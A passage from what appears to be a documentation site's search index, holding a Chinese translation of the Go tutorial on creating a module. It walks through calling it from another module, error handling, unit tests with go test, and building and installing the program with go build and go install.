\u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5728\u4e0e\u60a8\u6b63\u5728\u6d4b\u8bd5\u7684\u4ee3\u7801\u76f8\u540c\u7684\u5305\u4e2d\u5b9e\u73b0\u6d4b\u8bd5\u51fd\u6570\u3002 \u521b\u5efa\u4e24\u4e2a\u6d4b\u8bd5\u51fd\u6570\u6765\u6d4b\u8bd5 greetings.Hello \u51fd\u6570\u3002\u6d4b\u8bd5\u51fd\u6570\u540d\u79f0\u7684\u683c\u5f0f\u4e3a TestName \uff0c\u5176\u4e2d Name \u8bf4\u660e\u4e86\u7279\u5b9a\u6d4b\u8bd5\u3002\u6b64\u5916\uff0c\u6d4b\u8bd5\u51fd\u6570\u5c06\u6307\u5411\u5305 testing \u7c7b\u578b testing.T \u7684\u6307\u9488\u4f5c\u4e3a\u53c2\u6570\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u6b64\u53c2\u6570\u7684\u65b9\u6cd5\u6765\u62a5\u544a\u548c\u8bb0\u5f55\u60a8\u7684\u6d4b\u8bd5\u3002 \u5b9e\u65bd\u4e24\u4e2a\u6d4b\u8bd5\uff1a TestHelloName \u8c03\u7528 Hello \u51fd\u6570\uff0c\u4f20\u9012\u4e00\u4e2a name \u503c\uff0c\u51fd\u6570\u5e94\u8be5\u80fd\u591f\u4f7f\u7528\u8be5\u503c\u8fd4\u56de\u6709\u6548\u7684\u54cd\u5e94\u6d88\u606f\u3002\u5982\u679c\u8c03\u7528\u8fd4\u56de\u9519\u8bef\u6216\u610f\u5916\u54cd\u5e94\u6d88\u606f\uff08\u4e0d\u5305\u62ec\u60a8\u4f20\u5165\u7684\u540d\u79f0\uff09\uff0c\u5219\u4f7f\u7528t\u53c2\u6570\u7684 Fatalf \u65b9\u6cd5 \u5c06\u6d88\u606f\u6253\u5370\u5230\u63a7\u5236\u53f0\u5e76\u7ed3\u675f\u6267\u884c\u3002 TestHelloEmpty \u4f7f\u7528\u7a7a\u5b57\u7b26\u4e32\u8c03\u7528 Hello \u51fd\u6570\u3002\u6b64\u6d4b\u8bd5\u65e8\u5728\u786e\u8ba4\u60a8\u7684\u9519\u8bef\u5904\u7406\u662f\u5426\u6709\u6548\u3002\u5982\u679c\u8c03\u7528\u8fd4\u56de\u975e\u7a7a\u5b57\u7b26\u4e32\u6216\u6ca1\u6709\u9519\u8bef\uff0c\u5219\u4f7f\u7528 t \u53c2\u6570\u7684 Fatalf \u65b9\u6cd5\u5c06\u6d88\u606f\u6253\u5370\u5230\u63a7\u5236\u53f0\u5e76\u7ed3\u675f\u6267\u884c\u3002 \u5728greetings\u76ee\u5f55\u4e0b\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c go test \u547d\u4ee4 \u6267\u884c\u6d4b\u8bd5\u3002 go test \u547d\u4ee4\u5728\u6d4b\u8bd5\u6587\u4ef6\uff08\u540d\u79f0\u4ee5 _test.go \u7ed3\u5c3e\uff09\u4e2d\u6267\u884c\u6d4b\u8bd5\u51fd\u6570\uff08\u540d\u79f0\u4ee5 Test \u5f00\u5934\uff09\u3002\u60a8\u53ef\u4ee5\u6dfb\u52a0 -v \u6807\u5fd7\u4ee5\u83b7\u5f97\u5217\u51fa\u6240\u6709\u6d4b\u8bd5\u53ca\u5176\u7ed3\u679c\u7684\u8be6\u7ec6\u8f93\u51fa\u3002 $ go test PASS ok example.com/greetings 0.364s $ go test -v === RUN TestHelloName --- PASS: TestHelloName (0.00s) === RUN TestHelloEmpty --- PASS: TestHelloEmpty (0.00s) PASS ok example.com/greetings 0.372s \u4e2d\u65ad greetings.Hello \u51fd\u6570\u4ee5\u67e5\u770b\u5931\u8d25\u7684\u6d4b\u8bd5\u3002 TestHelloName \u6d4b\u8bd5\u51fd\u6570\u68c0\u67e5\u60a8\u6307\u5b9a\u540d\u79f0\u4e3a Hello \u7684\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002\u8981\u67e5\u770b\u5931\u8d25\u7684\u6d4b\u8bd5\u7ed3\u679c\uff0c\u8bf7\u66f4\u6539 greetings.Hello \u51fd\u6570\u4ee5\u4f7f\u5176\u4e0d\u518d\u5305\u542b\u540d\u79f0\u3002 \u5728 greetings/greetings.go \u4e2d\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u4ee3\u66ff Hello \u51fd\u6570\u3002\u8bf7\u6ce8\u610f\uff0c\u7a81\u51fa\u663e\u793a\u7684\u884c\u4f1a\u66f4\u6539\u51fd\u6570\u8fd4\u56de\u7684\u503c\uff0c\u5c31\u597d\u50cfname\u53c2\u6570\u88ab\u610f\u5916\u5220\u9664\u4e86\u4e00\u6837\u3002 // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return name, errors.New(\"empty name\") } // Create a message using a random format. // message := fmt.Sprintf(randomFormat(), name) message := fmt.Sprint(randomFormat()) return message, nil } \u5728greetings\u76ee\u5f55\u4e0b\uff0c\u8fd0\u884c go test \u6267\u884c\u6d4b\u8bd5\u3002 \u8fd9\u4e00\u6b21\uff0c\u5728 go test \u6ca1\u6709 -v \u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u3002\u8f93\u51fa\u5c06\u4ec5\u5305\u542b\u5931\u8d25\u6d4b\u8bd5\u7684\u7ed3\u679c\uff0c\u8fd9\u5728\u60a8\u6709\u5927\u91cf\u6d4b\u8bd5\u65f6\u5f88\u6709\u7528\u3002\u6d4b\u8bd5 TestHelloName \u5e94\u8be5\u5931\u8d25\u2014\u2014 TestHelloEmpty \u4ecd\u7136\u901a\u8fc7\u3002 $ go test --- FAIL: TestHelloName (0.00s) greetings_test.go:15: Hello(\"Gladys\") = \"Hail, %v! Well met!\", <nil>, want match for `\\bGladys\\b`, nil FAIL exit status 1 FAIL example.com/greetings 0.182s \u7f16\u8bd1\u548c\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f \uf0c1 \u5b66\u4e60\u51e0\u4e2a\u65b0 go \u547d\u4ee4\u3002\u867d\u7136\u8be5 go run \u547d\u4ee4\u662f\u5728\u60a8\u8fdb\u884c\u9891\u7e41\u66f4\u6539\u65f6\u7f16\u8bd1\u548c\u8fd0\u884c\u7a0b\u5e8f\u7684\u6709\u7528\u5feb\u6377\u65b9\u5f0f\uff0c\u4f46\u5b83\u4e0d\u4f1a\u751f\u6210\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u672c\u4e3b\u9898\u4ecb\u7ecd\u4e86\u7528\u4e8e\u6784\u5efa\u4ee3\u7801\u7684\u4e24\u4e2a\u9644\u52a0\u547d\u4ee4\uff1a \u8be5 go build \u547d\u4ee4 \u4f1a\u7f16\u8bd1\u8f6f\u4ef6\u5305\u53ca\u5176\u4f9d\u8d56\u9879\uff0c\u4f46\u4e0d\u4f1a\u5b89\u88c5\u7ed3\u679c\u3002 \u8be5 go install \u547d\u4ee4 \u7f16\u8bd1\u5e76\u5b89\u88c5\u5305\u3002 \u5e38\u7528\u547d\u4ee4 \u4ece hello \u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c go build \u547d\u4ee4\u5c06\u4ee3\u7801\u7f16\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u3002 $ go build \u4ece hello \u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u65b0\u7684 hello \u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u786e\u8ba4\u4ee3\u7801\u6709\u6548\u3002 \u8bf7\u6ce8\u610f\uff0c\u60a8\u7684\u7ed3\u679c\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u60a8\u662f\u5426\u5728\u6d4b\u8bd5\u540e\u66f4\u6539\u4e86 greetings.go \u4ee3\u7801\u3002 \u5728 Linux \u6216 Mac \u4e0a\uff1a $ ./hello map[Darrin:Great to see you, Darrin! Gladys:Hail, Gladys! Well met! Samantha:Hail, Samantha! Well met!] \u5728 Windows \u4e0a\uff1a $ hello.exe map[Darrin:Great to see you, Darrin! Gladys:Hail, Gladys! Well met! Samantha:Hail, Samantha! Well met!] \u60a8\u5df2\u5c06\u5e94\u7528\u7a0b\u5e8f\u7f16\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u8fd0\u884c\u5b83\u3002\u4f46\u662f\u8981\u5728\u5f53\u524d\u76ee\u5f55\u8fd0\u884c\u5b83\uff0c\u60a8\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u9700\u8981\u4f4d\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u76ee\u5f55\u4e2d\uff0c\u6216\u8005\u6307\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84\u3002 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u5b89\u88c5\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5728\u4e0d\u6307\u5b9a\u5176\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u5b83\u3002 \u53d1\u73b0 Go \u5b89\u88c5\u8def\u5f84\uff0c\u8be5 go \u547d\u4ee4\u5c06\u5728\u5176\u4e2d\u5b89\u88c5\u5f53\u524d\u5305\u3002 \u60a8\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c go list \u547d\u4ee4 \u6765\u53d1\u73b0\u5b89\u88c5\u8def\u5f84\uff0c \u5982\u4e0b\u4f8b\u6240\u793a\uff1a $ go list -f '{{.Target}}' \u4f8b\u5982\uff0c\u8be5\u547d\u4ee4\u7684\u8f93\u51fa\u53ef\u80fd\u4f1a /home/gopher/bin/hello \u663e\u793a \uff0c\u8fd9\u610f\u5473\u7740\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u88ab\u5b89\u88c5\u5230 /home/gopher/bin \u3002\u60a8\u5c06\u5728\u4e0b\u4e00\u6b65\u4e2d\u9700\u8981\u6b64\u5b89\u88c5\u76ee\u5f55\u3002 \u5c06 Go \u5b89\u88c5\u76ee\u5f55\u6dfb\u52a0\u5230\u7cfb\u7edf\u7684 shell \u8def\u5f84\u3002 \u8fd9\u6837\uff0c\u60a8\u5c06\u80fd\u591f\u8fd0\u884c\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u800c\u65e0\u9700\u6307\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 \u5728 Linux \u6216 Mac \u4e0a\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a $ export PATH=$PATH:/path/to/your/install/directory \u5728 Windows \u4e0a\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a $ set PATH=%PATH%;C:\\path\\to\\your\\install\\directory \u4f5c\u4e3a\u66ff\u4ee3\u65b9\u6848\uff0c\u5982\u679c\u60a8\u7684 shell \u8def\u5f84\u4e2d\u5df2\u7ecf\u6709\u4e00\u4e2a\u76ee\u5f55 $HOME/bin \uff0c\u5e76\u4e14\u60a8\u60f3\u5728\u90a3\u91cc\u5b89\u88c5\u60a8\u7684 Go \u7a0b\u5e8f\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 go env \u547d\u4ee4 \u8bbe\u7f6e\u53d8\u91cf GOBIN \u6765\u66f4\u6539\u5b89\u88c5\u76ee\u6807\uff1a $ go env -w GOBIN=/path/to/your/bin \u6216\u8005 $ go env -w GOBIN=C:\\path\\to\\your\\bin \u66f4\u65b0 shell \u8def\u5f84\u540e\uff0c\u8fd0\u884c go install \u547d\u4ee4\u7f16\u8bd1\u548c\u5b89\u88c5\u5305\u3002 $ go install \u53ea\u9700\u952e\u5165\u5176\u540d\u79f0\u5373\u53ef\u8fd0\u884c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u6709\u8da3\uff0c\u6253\u5f00\u4e00\u4e2a\u65b0\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5728\u5176\u4ed6\u76ee\u5f55\u4e2d\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u540d hello \u3002 $ hello map[Darrin:Hail, Darrin! Well met! Gladys:Great to see you, Gladys! Samantha:Hail, Samantha! Well met!]","title":"Create module"},{"location":"go/create_module/#create-go-module","text":"\u4ecb\u7ecd\u6a21\u5757\u3001\u51fd\u6570\u3001\u9519\u8bef\u5904\u7406\u3001\u6570\u7ec4\u3001map\u3001\u5355\u5143\u6d4b\u8bd5\u548c\u7f16\u8bd1\u5b89\u88c5.","title":"\u521b\u5efa Go \u6a21\u5757"},{"location":"go/create_module/#create-module","text":"\u5728\u4e00\u4e2a\u6a21\u5757\u4e2d\uff0c\u60a8\u4e3a\u4e00\u7ec4\u79bb\u6563\u4e14\u6709\u7528\u7684\u529f\u80fd\u6536\u96c6\u4e00\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5305\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u80fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u5177\u6709\u8d22\u52a1\u5206\u6790\u529f\u80fd\u7684\u5305\u7684\u6a21\u5757\uff0c\u4ee5\u4fbf\u5176\u4ed6\u7f16\u5199\u8d22\u52a1\u5e94\u7528\u7a0b\u5e8f\u7684\u4eba\u53ef\u4ee5\u4f7f\u7528\u60a8\u7684\u5de5\u4f5c\u3002\u6709\u5173\u5f00\u53d1\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u5f00\u53d1\u548c\u53d1\u5e03\u6a21\u5757 \u3002 Go \u4ee3\u7801\u88ab\u5206\u7ec4\u5230\u5305\u4e2d\uff0c\u5305\u88ab\u5206\u7ec4\u5230\u6a21\u5757\u4e2d\u3002\u60a8\u7684\u6a21\u5757\u6307\u5b9a\u4e86\u8fd0\u884c\u4ee3\u7801\u6240\u9700\u7684\u4f9d\u8d56\u9879\uff0c\u5305\u62ec Go \u7248\u672c\u548c\u5b83\u6240\u9700\u7684\u4e00\u7ec4\u5176\u4ed6\u6a21\u5757\u3002 \u4e3a Go \u6a21\u5757\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55 greetings \u3002 mkdir greetings cd greetings \u4f7f\u7528 \u547d\u4ee4 go mod init \u542f\u52a8\u60a8\u7684\u6a21\u5757 \u3002 \u8fd0\u884c go mod init \u547d\u4ee4\uff0c\u4f1a\u751f\u6210\u4f60\u7684\u6a21\u5757\u8def\u5f84\u2014\u2014 example.com/greetings . \u5982\u679c\u60a8\u53d1\u5e03\u4e00\u4e2a\u6a21\u5757\uff0c\u8fd9\u5fc5\u987b\u662f Go \u5de5\u5177\u53ef\u4ee5\u4ece\u4e2d\u4e0b\u8f7d\u60a8\u7684\u6a21\u5757\u7684\u8def\u5f84\u3002\u90a3\u5c06\u662f\u60a8\u7684\u4ee3\u7801\u5b58\u50a8\u5e93\u3002 \u6709\u5173\u4f7f\u7528\u6a21\u5757\u8def\u5f84\u547d\u540d\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 $ go mod init example.com/greetings go: creating new go.mod: module example.com/greetings \u521b\u5efa\u4ee3\u7801\u6587\u4ef6 greetings.go\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u5e76\u4fdd\u5b58\u6587\u4ef6\u3002 package greetings import \"fmt\" // Hello returns a greeting for the named person. func Hello(name string) string { // Return a greeting that embeds the name in a message. message := fmt.Sprintf(\"Hi, %v. Welcome!\", name) return message } \u8fd9\u662f\u60a8\u7684\u6a21\u5757\u7684\u7b2c\u4e00\u4e2a\u4ee3\u7801\u3002\u5b83\u4f1a\u5411\u4efb\u4f55\u8bf7\u6c42\u7684\u547c\u53eb\u8005\u8fd4\u56de\u95ee\u5019\u8bed\u3002\u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e00\u4e2a greetings \u5305\u6765\u6536\u96c6\u76f8\u5173\u529f\u80fd\u3002 \u5b9e\u73b0\u4e00\u4e2a Hello \u51fd\u6570\u6765\u8fd4\u56de\u95ee\u5019\u8bed\u3002 \u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u7c7b\u578b\u4e3a string \u7684\u53c2\u6570 name \u3002\u8be5\u51fd\u6570\u8fd8\u8fd4\u56de\u4e00\u4e2a string . \u5728 Go \u4e2d\uff0c \u540d\u79f0\u4ee5\u5927\u5199\u5b57\u6bcd\u5f00\u5934\u7684\u51fd\u6570\u53ef\u4ee5\u88ab\u4e0d\u5728\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u51fd\u6570\u8c03\u7528 \u3002\u8fd9\u5728 Go \u4e2d\u79f0\u4e3a\u5bfc\u51fa\u540d\u79f0\u3002\u6709\u5173\u5bfc\u51fa\u540d\u79f0\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go tour \u4e2d\u7684 \u5bfc\u51fa\u540d\u79f0 \u3002 \u58f0\u660e\u4e00\u4e2a message \u53d8\u91cf\u6765\u4fdd\u5b58\u4f60\u7684\u95ee\u5019\u3002 \u5728 Go \u4e2d\uff0c := \u8fd0\u7b97\u7b26\u662f\u5728\u4e00\u884c\u4e2d\u58f0\u660e\u548c\u521d\u59cb\u5316\u53d8\u91cf\u7684\u5feb\u6377\u65b9\u5f0f\uff08Go \u4f7f\u7528\u53f3\u4fa7\u7684\u503c\u6765\u786e\u5b9a\u53d8\u91cf\u7684\u7c7b\u578b\uff09\u3002\u4ece\u957f\u8fdc\u6765\u770b\uff0c\u60a8\u53ef\u80fd\u5df2\u5c06\u5176\u5199\u4e3a\uff1a var message string message = fmt.Sprintf(\"Hi, %v. Welcome!\", name) \u4f7f\u7528 fmt \u5305\u7684 Sprintf \u529f\u80fd \u6765\u521b\u5efa\u95ee\u5019\u6d88\u606f\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c Sprintf \u5c06\u53c2\u6570 name \u7684\u503c\u66ff\u6362\u4e3a\u683c\u5f0f\u52a8\u8bcd %v \u3002\u63d2\u5165\u53c2\u6570 name \u7684\u503c\u5b8c\u6210\u4e86\u95ee\u5019\u6587\u672c\u3002 \u5c06\u683c\u5f0f\u5316\u7684\u95ee\u5019\u8bed\u6587\u672c\u8fd4\u56de\u7ed9\u547c\u53eb\u8005\u3002","title":"\u521b\u5efa\u4e00\u4e2a\u5176\u4ed6\u4eba\u53ef\u4ee5\u4f7f\u7528\u7684\u6a21\u5757"},{"location":"go/create_module/#call-module-code","text":"\u4e3a Go \u6a21\u5757\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55 hello \uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u5939\u5199\u8c03\u7528\u8005\u7684\u4ee3\u7801\u3002 cd .. mkdir hello cd hello \u76ee\u5f55\u7ed3\u6784\u5982\u4e0b: <home>/ |-- greetings/ |-- hello/ \u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a \u8fd0\u884c go mod init \uff0c\u4e3a\u6a21\u5757\u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a $ go mod init example.com/hello go: creating new go.mod: module example.com/hello \u521b\u5efa\u4ee3\u7801\u6587\u4ef6 hello.go \u5e76\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801 package main import ( \"fmt\" \"example.com/greetings\" ) func main() { // Get a greeting message and print it. message := greetings.Hello(\"Gladys\") fmt.Println(message) } \u5728\u6b64\u6bb5\u4ee3\u7801\u4e2d\uff0c\u60a8: - \u58f0\u660e\u4e00\u4e2a main \u5305\u3002\u5728Go\u4e2d\uff0c\u4f5c\u4e3a\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u7684\u4ee3\u7801\u5fc5\u987b\u5728 main \u5305\u4e2d\u3002 - \u5bfc\u5165\u4e24\u4e2a\u5305 example.com/greetings \u548c fmt \u3002\u8fd9\u4f7f\u5f97\u60a8\u7684\u4ee3\u7801\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u5305\u7684\u51fd\u6570\u3002\u5bfc\u5165 example.com/greetings \uff08\u60a8\u4e4b\u524d\u521b\u5efa\u7684\u6a21\u5757\u4e2d\u7684\u5305\uff09 \u4f7f\u60a8\u53ef\u4ee5\u8bbf\u95ee Hello \u51fd\u6570\u3002\u5bfc\u5165 fmt \uff0c\u5177\u6709\u5904\u7406\u8f93\u5165\u548c\u8f93\u51fa\u6587\u672c\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u5c06\u6587\u672c\u6253\u5370\u5230\u63a7\u5236\u53f0\u3002 \u7f16\u8f91 example.com/hello \u6a21\u5757\u4ee5\u4f7f\u7528\u60a8\u7684\u672c\u5730 example.com/greetings \u6a21\u5757\u3002 \u5bf9\u4e8e\u751f\u4ea7\u7528\u9014\uff0c\u60a8\u5c06 example.com/greetings \u4ece\u5176\u5b58\u50a8\u5e93\u53d1\u5e03\u6a21\u5757\uff08\u4f7f\u7528\u53cd\u6620\u5176\u53d1\u5e03\u4f4d\u7f6e\u7684\u6a21\u5757\u8def\u5f84\uff09\uff0cGo \u5de5\u5177\u53ef\u4ee5\u5728\u5176\u4e2d\u627e\u5230\u5b83\u5e76\u4e0b\u8f7d\u5b83\u3002\u76ee\u524d\uff0c\u7531\u4e8e\u60a8\u5c1a\u672a\u53d1\u5e03\u8be5\u6a21\u5757\uff0c\u60a8\u9700\u8981\u8c03\u6574\u8be5 example.com/hello \u6a21\u5757\uff0c\u4ee5\u4fbf\u5b83\u53ef\u4ee5\u5728\u60a8\u7684\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e0a\u627e\u5230 example.com/greetings \u4ee3\u7801\u3002 \u4e3a\u6b64\uff0c\u8bf7\u4f7f\u7528 go mod edit command \u547d\u4ee4\u7f16\u8f91 example.com/hello \u6a21\u5757\u4ee5\u5c06 Go \u5de5\u5177\u4ece\u5176\u6a21\u5757\u8def\u5f84\uff08\u6a21\u5757\u6240\u5728\u7684\u4f4d\u7f6e\uff09\u91cd\u5b9a\u5411\u5230\u672c\u5730\u76ee\u5f55\uff08\u6a21\u5757\u6240\u5728\u7684\u4f4d\u7f6e\uff09\u3002 \u5728 hello \u76ee\u5f55\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4: $ go mod edit -replace example.com/greetings=../greetings \u8be5\u547d\u4ee4\u6307\u5b9a example.com/greetings \u5e94\u66ff\u6362 ../greetings \u4f5c\u4e3a\u4f9d\u8d56\u9879\u7684\u5b9a\u4f4d\u3002\u8fd0\u884c\u547d\u4ee4\u540e\uff0c hello \u76ee\u5f55\u4e2d\u7684 go.mod \u6587\u4ef6\u5e94\u8be5\u5305\u542b\u4e00\u4e2a replace \u6307\u4ee4 \uff1a module example.com/hello go 1.16 replace example.com/greetings => ../greetings \u5728 hello \u76ee\u5f55\u4e2d\u4e0b\uff0c\u8fd0\u884c go mod tidy \u547d\u4ee4\u540c\u6b65\u6a21\u5757 example.com/hello \u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u6dfb\u52a0\u4ee3\u7801\u6240\u9700\u4f46\u5c1a\u672a\u5728\u6a21\u5757\u4e2d\u8ddf\u8e2a\u7684\u90a3\u4e9b\u3002 $ go mod tidy go: found example.com/greetings in example.com/greetings v0.0.0-00010101000000-000000000000 \u547d\u4ee4\u5b8c\u6210\u540e\uff0c example.com/hello \u6a21\u5757\u7684 go.mod \u6587\u4ef6\u5e94\u5982\u4e0b\u6240\u793a\uff1a module example.com/hello go 1.16 replace example.com/greetings => ../greetings require example.com/greetings v0.0.0-00010101000000-000000000000 \u8be5\u547d\u4ee4\u5728 greetings \u76ee\u5f55\u4e2d\u627e\u5230\u4e86\u672c\u5730\u4ee3\u7801\uff0c\u7136\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a require \u6307\u4ee4 \u6765\u6307\u5b9a example.com/hello \u4f9d\u8d56 example.com/greetings \u3002\u60a8\u5728 hello.go \u4e2d\u5bfc\u5165 greetings \u5305\u65f6\u521b\u5efa\u4e86\u6b64\u4f9d\u8d56\u9879\u3002 \u6a21\u5757\u8def\u5f84\u540e\u9762\u7684\u6570\u5b57\u662f\u4e00\u4e2a \u4f2a\u7248\u672c\u53f7 \u2014\u2014\u4e00\u4e2a\u751f\u6210\u7684\u6570\u5b57\u7528\u6765\u4ee3\u66ff\u8bed\u4e49\u7248\u672c\u53f7\uff08\u6a21\u5757\u8fd8\u6ca1\u6709\uff09\u3002 \u8981\u5f15\u7528 \u5df2\u53d1\u5e03 \u7684\u6a21\u5757\uff0cgo.mod \u6587\u4ef6\u901a\u5e38\u4f1a\u7701\u7565 replace \u6307\u4ee4\u5e76\u4f7f\u7528 require \u672b\u5c3e\u5e26\u6709\u6807\u8bb0\u7248\u672c\u53f7\u7684\u6307\u4ee4\u3002 require example.com/greetings v1.1.0 \u5728 hello \u76ee\u5f55\u4e0b\uff0c\u8fd0\u884c\u4ee3\u7801\u4ee5\u786e\u8ba4\u5176\u5de5\u4f5c\u3002 $ go run . Hi, Gladys. Welcome!","title":"\u5728\u53e6\u4e00\u4e2a\u6a21\u5757\u4e2d\u8c03\u7528\u4ee3\u7801"},{"location":"go/create_module/#return-and-handle-errors","text":"\u5904\u7406\u9519\u8bef\u662f\u53ef\u9760\u4ee3\u7801\u7684\u57fa\u672c\u7279\u5f81\u3002\u5728\u4e0b\u9762\u7684\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e9b\u4ee3\u7801\u4ee5\u4ecegreetings\u6a21\u5757\u8fd4\u56de\u9519\u8bef\uff0c\u7136\u540e\u5728\u8c03\u7528\u8005\u4e2d\u5904\u7406\u5b83\u3002 \u4fee\u6539 greetings/greetings.go \u5982\u4e0b\u4ee3\u7801\u3002 \u5982\u679c\u60a8\u4e0d\u77e5\u9053\u8be5\u95ee\u5019\u8c01\uff0c\u90a3\u4e48\u53d1\u9001\u95ee\u5019\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002\u5982\u679c\u540d\u79f0\u4e3a\u7a7a\uff0c\u5219\u5411\u8c03\u7528\u8005\u8fd4\u56de\u9519\u8bef\u3002\u5c06\u4ee5\u4e0b\u4ee3\u7801\u590d\u5236\u5230 greetings.go \u5e76\u4fdd\u5b58\u6587\u4ef6\u3002 package greetings import ( \"errors\" \"fmt\" ) // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return \"\", errors.New(\"empty name\") } // If a name was received, return a value that embeds the name // in a greeting message. message := fmt.Sprintf(\"Hi, %v. Welcome!\", name) return message, nil } \u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u66f4\u6539\u51fd\u6570\uff0c\u4f7f\u5176\u8fd4\u56de\u4e24\u4e2a\u503c\uff1a \u4e00\u4e2a string \u548c\u4e00\u4e2a error \u3002\u60a8\u7684\u8c03\u7528\u8005\u5c06\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\u4ee5\u67e5\u770b\u662f\u5426\u53d1\u751f\u9519\u8bef\u3002\uff08\u4efb\u4f55 Go \u51fd\u6570\u90fd\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Effective Go \u3002\uff09 \u5bfc\u5165 Go \u6807\u51c6\u5e93 errors \u5305\uff0c\u4ee5\u4fbf\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u7684 errors.New \u51fd\u6570 \u3002 \u6dfb\u52a0\u4e00\u6761 if \u8bed\u53e5\u4ee5\u68c0\u67e5\u65e0\u6548\u8bf7\u6c42\uff08\u540d\u79f0\u5e94\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff09\u5e76\u5728\u8bf7\u6c42\u65e0\u6548\u65f6\u8fd4\u56de\u9519\u8bef\u3002\u8be5 errors.New \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a error \u5185\u90e8\u5e26\u6709\u60a8\u7684\u6d88\u606f\u3002 \u6dfb\u52a0 nil \uff08\u610f\u5473\u7740\u6ca1\u6709\u9519\u8bef\uff09\u4f5c\u4e3a\u6210\u529f\u8fd4\u56de\u7684\u7b2c\u4e8c\u4e2a\u503c\u3002\u8fd9\u6837\uff0c\u8c03\u7528\u8005\u5c31\u53ef\u4ee5\u770b\u5230\u51fd\u6570\u6210\u529f\u4e86\u3002 \u5728 hello/hello.go \u6587\u4ef6\u4e2d\uff0c\u5904\u7406 Hello \u51fd\u6570\u73b0\u5728\u8fd4\u56de\u7684\u9519\u8bef\u4ee5\u53ca\u975e\u9519\u8bef\u503c\u3002 package main import ( \"fmt\" \"log\" \"example.com/greetings\" ) func main() { // Set properties of the predefined Logger, including // the log entry prefix and a flag to disable printing // the time, source file, and line number. log.SetPrefix(\"greetings: \") log.SetFlags(0) // Request a greeting message. message, err := greetings.Hello(\"\") // If an error was returned, print it to the console and // exit the program. if err != nil { log.Fatal(err) } // If no error was returned, print the returned message // to the console. fmt.Println(message) } \u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5c06 log \u5305 